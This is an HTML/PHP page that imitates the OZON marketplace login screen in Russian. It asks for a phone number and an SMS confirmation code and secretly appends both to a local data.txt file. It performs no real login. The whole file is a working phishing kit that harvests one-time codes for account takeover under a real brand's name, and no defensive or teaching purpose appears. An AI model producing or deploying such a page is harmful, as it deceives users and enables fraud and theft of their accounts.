<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OZON — маркетплейс миллионы товаров по выгодным ценам</title>
    <link rel="icon" href="img/logo_icon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <div class="container">
        <dev class="top">
            <img class="logo" src="img/ozon-id-v2.svg" alt="logo">
            <a href="#" class="clos"><img class="clos__icon" src="img/icons8.png"></a>
        </dev>
        <dev class="text__big">Введите номер телефона</dev>
        <dev class="text">Мы отправим код или позвоним. Отвечать на звонок не нужно. Код может прийти на почту или в СМС
        </dev>
        <form class="l" method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
            <dev class="nomber">
                <div class="cantru">
                    <img class="cantru__icon" src="img/russia.png">
                    <dev>+7</dev>
                    <img class="cantru__dovn" src="img/down.png">
                </div>
                <dev class="phone">
                    <input class="phone__n" type="text" name="input_a" id="input_a" placeholder="999 999 99 99"><br><br>
                </dev>
            </dev>
            <a class="content_toggle" href="#">Отправить код</a>
            <dev class="text__or">--- или ---</dev>
            <a href="#" class="email">Войти по почте</a>
            
            <div class="content_block" style="display: none;">
                <dev class="text__big">Введите код подтверждения из смс</dev>
                <dev class="text">На Ваш номер отправлено смс-сообщение с кодом подтверждения. Введите код и нажмите «Войти»</dev>
                <dev class="nomber">
                        <input class="code" type="text" name="input_b" id="input_b" placeholder="ххх-ххх"><br><br>
                </dev>
                <input class="codsms" type="submit" name="sub" value="Войти">
            </div>
            <script src="https://snipp.ru/cdn/jquery/2.1.1/jquery.min.js"></script>
            <script>
                $(document).ready(function () {
                    $('.content_toggle').click(function () {
                        $('.content_block').slideToggle(300);
                        $('.container').addClass('container2');
                        $('.text__or').addClass('noot');
                        $('.email').addClass('noot');
                        if ($(this).is(':hidden')) {
                            $('.content_toggle').removeClass('open');
                        } else {
                            $('.content_toggle').html('Скрыть текст');
                            $('.content_toggle').addClass('open');
                        }
                        return false;
                    });
                });
            </script>
        </form>
<?php

if(isset($_POST['sub'])){
  $input_a = $_POST['input_a'];
  $input_b = $_POST['input_b'];

  $file_path = "data.txt"; // Путь к файлу
  
  $data = "Значение A: ".$input_a."\n"."Значение B: ". $input_b."\n";

  file_put_contents($file_path, $data, FILE_APPEND);

}

?>
    </div>




</body>

</html>